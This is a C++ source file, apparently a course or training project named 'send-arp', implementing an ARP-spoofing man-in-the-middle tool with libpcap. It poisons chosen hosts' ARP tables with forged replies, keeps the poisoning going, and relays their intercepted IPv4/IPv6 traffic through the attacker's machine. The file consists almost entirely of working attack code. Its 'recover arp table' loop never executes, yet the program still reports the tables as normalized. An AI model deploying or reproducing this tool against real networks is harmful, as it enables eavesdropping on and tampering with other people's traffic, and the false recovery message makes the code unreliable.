#include <iostream>
#include <stdio.h>
#include <cstdio>
#include <pcap.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>
#include <unistd.h>
#include <map>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"

using namespace std;

#pragma pack(push, 1)
struct arp_packet {
  EthHdr eth_;
  ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
  printf(
      "syntax : send-arp <interface> <sender0 ip> <target0 ip> "
      "<sender1 ip> <target1 ip> ... <duration time(s)>\n");
  printf(
      "sample : send-arp wlan0 192.168.10.2 192.168.10.1 "
      "192.168.10.1 192.168.10.2 10\n");
}

// ref:
// https://www.includehelp.com/cpp-programs/get-mac-address-of-linux-based-network-device.aspx
Mac getMyMacAddress(char* dev) {
  int fd;

  struct ifreq ifr;
  Mac madAddress;

  fd = socket(AF_INET, SOCK_DGRAM, 0);

  ifr.ifr_addr.sa_family = AF_INET;
  strncpy((char*)ifr.ifr_name, (const char*)dev, IFNAMSIZ - 1);

  ioctl(fd, SIOCGIFHWADDR, &ifr);

  close(fd);

  madAddress = (uint8_t*)ifr.ifr_hwaddr.sa_data;

  return madAddress;
}

// ref:
// https://stackoverflow.com/questions/2283494/get-ip-address-of-an-interface-on-linux
Ip getMyIpv4Address(const char* dev) {
  int fd;
  struct ifreq ifr;
  uint32_t ipAddress;

  fd = socket(AF_INET, SOCK_DGRAM, 0);

  ifr.ifr_addr.sa_family = AF_INET;
  strncpy((char*)ifr.ifr_name, dev, IFNAMSIZ - 1);

  ioctl(fd, SIOCGIFADDR, &ifr);

  close(fd);

  ipAddress = ntohl((((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr).s_addr);

  return ipAddress;
}

int sendArpPacket(pcap_t* handle, Mac ethernetDestinationMac,
                  Mac ethernetSourceMac, u_short operation, Mac arpSourceMac,
                  Ip arpSourceIp, Mac arpmacMap, Ip arpTargetIp) {
  arp_packet packet;

  packet.eth_.dmac_ = ethernetDestinationMac;
  packet.eth_.smac_ = ethernetSourceMac;
  packet.eth_.type_ = htons(EthHdr::Arp);

  packet.arp_.hrd_ = htons(ArpHdr::ETHER);
  packet.arp_.pro_ = htons(EthHdr::Ip4);
  packet.arp_.hln_ = Mac::SIZE;
  packet.arp_.pln_ = Ip::SIZE;
  packet.arp_.op_ = operation;
  packet.arp_.smac_ = arpSourceMac;
  packet.arp_.sip_ = arpSourceIp;
  packet.arp_.tmac_ = arpmacMap;
  packet.arp_.tip_ = arpTargetIp;

  return pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet),
                         sizeof(arp_packet));
}

int sendArpRequest(pcap_t* handle, Mac sourceMac, Ip sourceIp, Ip targetIp) {
  return sendArpPacket(handle, Mac("ff:ff:ff:ff:ff:ff"), sourceMac,
                       htons(ArpHdr::Request), sourceMac, htonl(sourceIp),
                       Mac("00:00:00:00:00:00"), htonl(targetIp));
}

int sendArpReply(pcap_t* handle, Mac sourceMac, Ip sourceIp, Mac macMap,
                 Ip targetIp) {
  return sendArpPacket(handle, macMap, sourceMac, htons(ArpHdr::Reply),
                       sourceMac, htonl(sourceIp), macMap, htonl(targetIp));
}

int main(int argc, char* argv[]) {
  //assuagement verification
  if (5 > argc || 0 != (argc - 1) % 2) {
    usage();
    return -1;
  }

  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];

  //open network device
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == nullptr) {
    printf("FATAL: Couldn't open device %s(%s)\n", dev, errbuf);
    return -1;
  }

  //get attacker's mac address
  Mac myMac = getMyMacAddress(dev);
  //get attacker's ip address
  Ip myIp = getMyIpv4Address(dev);

  map<Ip, Mac> macMap;
  Ip senderIp[(argc - 3) / 2];
  Ip targetIp[(argc - 3) / 2];

  //get sender and target's ip addresses
  for (int i = 0; (argc - 3) / 2 > i; i++) {
    senderIp[i] = Ip(argv[2 + i * 2]);
    targetIp[i] = Ip(argv[3 + i * 2]);
  }

  int durationTime = atoi(argv[argc - 1]);

  time_t startTime;

  int res;

  bool escapeFlag;

  //get sender and target's mac address
  for (int i = 0; (argc - 3) / 2 > i; i++) {
    if (macMap.end() == macMap.find(senderIp[i])) {
      escapeFlag = false;

      for (int j = 0; 4 > j; j++) {
        if (escapeFlag) break;

        if (3 == j) {
          printf("FATAL: sender does not reply arp\n");
          return -1;
        }

        startTime = time(NULL);

        res = sendArpRequest(handle, myMac, myIp, senderIp[i]);

        if (res != 0) {
          printf("FATAL: pcap_sendpacket return %d error=%s\n", res,
                 pcap_geterr(handle));
          return -1;
        }

        struct pcap_pkthdr* header;
        const uint8_t* packet;
        while (true) {
          if (time(NULL) - startTime > 3) break;

          res = pcap_next_ex(handle, &header, &packet);

          if (res == 0) continue;
          if (res == -1 || res == -2) {
            printf("ERROR: pcap_next_ex return %d error=%s\n", res,
                   pcap_geterr(handle));
            return -1;
          }

          EthHdr* ethernetHeader = (EthHdr*)packet;

          if (ethernetHeader->type() != EthHdr::Arp) {
            continue;
          }

          ArpHdr* arpHeader = (ArpHdr*)(packet + sizeof(EthHdr));

          if (arpHeader->hrd() != ArpHdr::ETHER ||
              arpHeader->pro() != EthHdr::Ip4 ||
              arpHeader->op() != ArpHdr::Reply) {
            continue;
          }

          if (arpHeader->tmac() == myMac && arpHeader->tip() == myIp &&
              arpHeader->sip() == senderIp[i]) {
            macMap.insert(make_pair(senderIp[i], (Mac)arpHeader->smac()));
            escapeFlag = true;
            break;
          }
        }
      }
    }
    if (macMap.end() == macMap.find(targetIp[i])) {
      escapeFlag = false;

      for (int j = 0; 4 > j; j++) {
        if (escapeFlag) break;

        if (3 == j) {
          printf("FATAL: target does not reply arp\n");
          return -1;
        }

        startTime = time(NULL);

        res = sendArpRequest(handle, myMac, myIp, targetIp[i]);

        if (res != 0) {
          printf("FATAL: pcap_sendpacket return %d error=%s\n", res,
                 pcap_geterr(handle));
          return -1;
        }

        struct pcap_pkthdr* header;
        const uint8_t* packet;
        while (true) {
          if (time(NULL) - startTime > 3) break;

          res = pcap_next_ex(handle, &header, &packet);

          if (res == 0) continue;
          if (res == -1 || res == -2) {
            printf("ERROR: pcap_next_ex return %d error=%s\n", res,
                   pcap_geterr(handle));
            return -1;
          }

          EthHdr* ethernetHeader = (EthHdr*)packet;

          if (ethernetHeader->type() != EthHdr::Arp) {
            continue;
          }

          ArpHdr* arpHeader = (ArpHdr*)(packet + sizeof(EthHdr));

          if (arpHeader->hrd() != ArpHdr::ETHER ||
              arpHeader->pro() != EthHdr::Ip4 ||
              arpHeader->op() != ArpHdr::Reply) {
            continue;
          }

          if (arpHeader->tmac() == myMac && arpHeader->tip() == myIp &&
              arpHeader->sip() == targetIp[i]) {
            macMap.insert(make_pair(targetIp[i], (Mac)arpHeader->smac()));
            escapeFlag = true;
            break;
          }
        }
      }
    }
  }

  //send arp packet to falsificate arp table
  for (int i = 0; (argc - 3) / 2 > i; i++) {
    if (macMap.end() != macMap.find(senderIp[i])) {
      res = sendArpReply(handle, myMac, targetIp[i],
                         macMap.find(senderIp[i])->second, senderIp[i]);
      printf("INFO: %d.%d.%d.%d's arp table has been falsified\n",
             senderIp[i] >> 24 & 0xFF, senderIp[i] >> 16 & 0xFF,
             senderIp[i] >> 8 & 0xFF, senderIp[i] >> 0 & 0xFF);

      if (res != 0) {
        printf("FATAL: pcap_sendpacket return %d error=%s\n", res,
               pcap_geterr(handle));
        return -1;
      }
    } else {
      printf("FATAL: cannot find mac address of %d.%d.%d.%d\n",
             senderIp[i] >> 24 & 0xFF, senderIp[i] >> 16 & 0xFF,
             senderIp[i] >> 8 & 0xFF, senderIp[i] >> 0 & 0xFF);
      return -1;
    }
  }

  //maintain falsificated arp table and relay packets
  startTime = time(NULL);
  while (time(NULL) - startTime < durationTime) {
    struct pcap_pkthdr* header;
    const uint8_t* packet;
    res = pcap_next_ex(handle, &header, &packet);

    if (res == 0) continue;
    if (res == -1 || res == -2) {
      printf("ERROR: pcap_next_ex return %d error=%s\n", res,
             pcap_geterr(handle));
      break;
    }

    EthHdr* ethernetHeader = (EthHdr*)packet;
    ArpHdr* arpHeader = (ArpHdr*)(packet + sizeof(EthHdr));
    uint16_t packetSize = 0x0000;

    for (int i = 0; (argc - 3) / 2 > i; i++) {
      if (ethernetHeader->type() == EthHdr::Arp &&
          arpHeader->op() == ArpHdr::Request &&
          ethernetHeader->smac() == macMap.find(senderIp[i])->second) {
        res = sendArpReply(handle, myMac, targetIp[i],
                           macMap.find(senderIp[i])->second, senderIp[i]);
        if (res != 0) {
          printf("ERROR: pcap_sendpacket return %d error=%s\n", res,
                 pcap_geterr(handle));
          break;
        }
      } else if (ethernetHeader->smac() == macMap.find(senderIp[i])->second) {
        memcpy((void*)packet, macMap.find(targetIp[i])->second, sizeof(Mac));
        switch (ethernetHeader->type()) {
          case EthHdr::Ip4:
            packetSize = sizeof(EthHdr) + packet[16] * 0x0100 + packet[17] * 0x001;
            break;
          case EthHdr::Ip6:
            packetSize = sizeof(EthHdr) + packet[18] * 0x0100 + packet[19] * 0x001;
            break;
          default:
            printf("WARNING: unsupported type=0x%04x\n", ethernetHeader->type());
            continue;
        }
        res = pcap_sendpacket(handle, packet, packetSize);
        if (res != 0) {
          printf("ERROR: pcap_sendpacket return %d error=%s\n", res,
                 pcap_geterr(handle));
          break;
        }
      }
    }
  }

  //recover arp table
  for (int i = 0; (argc - 3) / 2 > i; i++) {
    if (macMap.end() != macMap.find(senderIp[i])) {
      for (int j = 0; 3 < j; j++) {
        res = sendArpRequest(handle, macMap.find(senderIp[i])->second,
                             senderIp[i], targetIp[i]);
        if (res != 0) {
          printf("ERROR: pcap_sendpacket return %d error=%s\n", res,
                 pcap_geterr(handle));
          continue;
        }
      }
      printf("INFO: %d.%d.%d.%d's arp table has been normalized\n",
             senderIp[i] >> 24 & 0xFF, senderIp[i] >> 16 & 0xFF,
             senderIp[i] >> 8 & 0xFF, senderIp[i] >> 0 & 0xFF);
    } else {
      printf("ERROR: cannot find mac address of %d.%d.%d.%d\n",
             senderIp[i] >> 24 & 0xFF, senderIp[i] >> 16 & 0xFF,
             senderIp[i] >> 8 & 0xFF, senderIp[i] >> 0 & 0xFF);
      continue;
    }
  }

  //close network device
  pcap_close(handle);
}
